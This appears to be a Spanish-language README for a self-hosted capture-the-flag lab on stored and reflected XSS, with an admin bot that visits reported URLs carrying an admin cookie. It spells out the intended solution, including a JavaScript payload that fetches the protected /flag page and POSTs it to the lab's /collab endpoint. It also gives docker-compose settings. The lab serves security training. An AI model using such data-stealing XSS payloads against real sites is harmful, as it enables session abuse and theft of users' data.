XSS Pro con Admin Bot
=====================

Servicios:
- web-xss (Node, puerto 3000)
- xss-bot (Puppeteer + Chromium) visita URLs reportadas con cookie `is_admin=1`

Flujo:
1) Guarda tu payload en /guestbook (o arma URL en /search o /preview).
2) Reporta la URL en /report (solo rutas locales, ej: /guestbook). El sistema te da un id.
3) El bot visita tu URL con sesión admin. Haz que tu payload haga:
   fetch('/flag').then(r=>r.text())
     .then(f=>fetch('/collab?id=ID',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:f})}))
4) Consulta /collab?id=ID para ver lo que se exfiltró (debería incluir la flag).

Protección:
- /flag solo responde a peticiones con cookie is_admin=1 (el bot la trae).

Compose:
Añade a docker-compose.yml:

  web-xss:
    build: ./web-xss
    environment:
      SEED: "1337"
      ADMIN_TOKEN: "xss-admin-token"
    networks: [ labnet ]

  xss-bot:
    build: ./xss-bot
    environment:
      ORIGIN: "http://web-xss:3000"
      ADMIN_TOKEN: "xss-admin-token"
    depends_on: [ web-xss ]
    networks: [ labnet ]

Y en nginx.conf ya tienes el prefijo /xss/ apuntando a web_xss. 
